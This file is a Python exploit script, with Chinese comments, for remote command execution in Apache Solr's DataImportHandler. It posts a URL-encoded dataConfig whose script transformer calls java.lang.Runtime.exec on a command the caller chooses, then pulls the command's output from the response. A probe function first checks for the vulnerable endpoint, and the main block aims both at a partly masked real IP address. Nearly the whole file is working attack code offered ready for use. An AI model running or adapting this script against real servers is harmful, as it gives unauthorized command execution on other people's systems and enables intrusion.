#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2021-02-21 16:34:54
# @Author  : 江南小虫虫 (fwh13612265462@gmail.com)
# @Link    : https://fengwenhua.top

import requests
requests.packages.urllib3.disable_warnings()
import urllib.parse
import re

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'


def exp(target, cmd):
    """执行命令
    :param target: 目标，http(s)://ip(domain):port，后面没有/
    :param cmd: 要执行的命令
    :return 返回命令执行的结果
    """
    cmd = urllib.parse.quote(cmd)
    URL = '''{}/solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22{}%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20'''.format(target, cmd)
    files = {'stream.body': '''<?xml version="1.0" encoding="UTF-8"?>
	<RDF>
	<item/>
	</RDF>'''}

    headers = {
        'User-Agent': UA
    }
    r = requests.post(URL, files=files, headers=headers, verify=False)
    if r.status_code == 200:
        print("Yes!!VUL!!!")
    else:
        print("NO VUL")
    final_result = r.text
    result = re.search(
        r'documents"><lst><arr name="title"><str>([\s\S]*?)</str></arr></lst>', final_result, re.I)
    if result:
        final_result = result.group(1)
    else:
        print("正则没匹配到，直接输出原文")
    print("命令执行结果：")
    print(final_result)
    return final_result


def poc(target):
    """验证是否可能存在漏洞
    :param target: 目标，http(s)://ip(domain):port，后面没有/
    :return
    """
    url = '{}/solr/flow/dataimport'.format(target)
    headers = {
        'User-Agent': UA
    }
    r = requests.get(url, headers=headers, verify=False)
    #  and '<lst name="responseHeader">' in r.text
    # print("漏洞探测：")
    if r.status_code == 200:
        # print(r.text)
        return True
    else:
        # print(r.text)
        return False


if __name__ == '__main__':
    target = 'https://139.224.x.x:8443'
    cmd = 'ipconfig /all'
    if poc(target):
        exp(target, cmd)
    else:
        print('NO VUL')
